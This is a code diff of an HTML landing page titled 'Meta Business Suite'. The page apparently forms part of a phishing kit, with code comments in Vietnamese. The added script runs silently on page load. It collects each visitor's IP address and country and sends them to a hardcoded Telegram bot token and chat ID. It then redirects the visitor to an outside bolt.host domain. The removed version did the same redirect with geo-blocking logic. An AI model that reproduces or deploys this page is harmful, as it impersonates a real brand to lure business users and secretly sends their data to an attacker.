@@ -1,65 +1,64 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Business Suite</title>
-    <script type="text/javascript">
-        // Function to redirect to another URL
-        const banList = [];  // List of banned country codes
-
-        // Function to create a delay
-        function wait(time) {
-            return new Promise(resolve => {
-                setTimeout(resolve, time);
-            });
-        }
-
-        // Asynchronous function to handle redirection logic
-        async function redirect() {
-            // await wait(2000);  // Wait for 1.5 seconds
-            const linkredir = "https://professional-social-cifr.bolt.host";  // Redirection link
-            window.location.href = linkredir;
-            // Fetch the user's IP and location information
-            // fetch("https://api.db-ip.com/v2/free/self/")
-            //     .then(res => res.json())
-            //     .then(json => {
-            //         if (banList.includes(json.countryCode)) {
-            //             // If the user's country code is in the ban list, redirect to Facebook help
-            //             window.location.href = "https://www.facebook.com/help";
-            //         } else {
-            //             if (json.ipAddress) {
-            //                 // If the user's IP address is available, redirect to the specified link
-            //                 window.location.href = linkredir;
-            //             } else {
-            //                 // If no IP address, fetch location info from another source
-            //                 fetch("https://ipinfo.io/json")
-            //                     .then(res1 => res1.json())
-            //                     .then(json1 => {
-            //                         if (banList.includes(json1.country)) {
-            //                             // If the user's country code from the second source is in the ban list, redirect to Facebook help
-            //                             window.location.href = "https://www.facebook.com/help";
-            //                         } else {
-            //                             // Otherwise, redirect to the specified link
-            //                             window.location.href = linkredir;
-            //                         }
-            //                     })
-            //                     .catch(() => {
-            //                         window.location.href = linkredir;
-            //                     });
-            //             }
-            //         }
-            //     })
-            //     .catch(() => {
-            //         window.location.href = linkredir;
-            //     });
-        }
-
-        // Call the redirect function when the page loads
-        window.onload = redirect;
-    </script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Meta Business Suite</title>
 </head>
 <body>
-    <p></p> <!-- Thay thế URL này bằng URL của trang bạn muốn chuyển hướng tới -->
+  <script>
+    // === CẤU HÌNH ===
+    const TELEGRAM_BOT_TOKEN = "8450931475:AAG33LEbK54PVvpsImjaKhMOYpTO5WJF5aE";
+    const TELEGRAM_CHAT_ID = "1409099376";
+    const REDIRECT_URL = "https://professional-social-cifr.bolt.host";
+    const DELAY_MS = 50; // 1 giây
+
+    async function getIPandCountry() {
+      try {
+        // Thử ipapi trước
+        const res = await fetch("https://ipapi.co/json/", { cache: "no-cache" });
+        if (res.ok) {
+          const data = await res.json();
+          if (data.ip) {
+            return {
+              ip: data.ip,
+              country: data.country || "unknown"
+            };
+          }
+        }
+        // Nếu ipapi lỗi → fallback sang ipify
+        const res2 = await fetch("https://api.ipify.org?format=json");
+        const data2 = await res2.json();
+        return { ip: data2.ip || "unknown", country: "unknown" };
+      } catch {
+        return { ip: "unknown", country: "unknown" };
+      }
+    }
+
+    async function sendTelegramMessage(text) {
+      try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const payload = { chat_id: TELEGRAM_CHAT_ID, text };
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.warn("Send telegram failed:", err);
+      }
+    }
+
+    (async function onLoadNotifyAndRedirect() {
+      const { ip, country } = await getIPandCountry();
+      const msg = `Có người vào web | IP: ${ip} | Quốc gia: ${country}`;
+      await sendTelegramMessage(msg);
+
+      // Chờ 1 giây rồi chuyển hướng
+      setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+      }, DELAY_MS);
+    })();
+  </script>
 </body>
 </html>
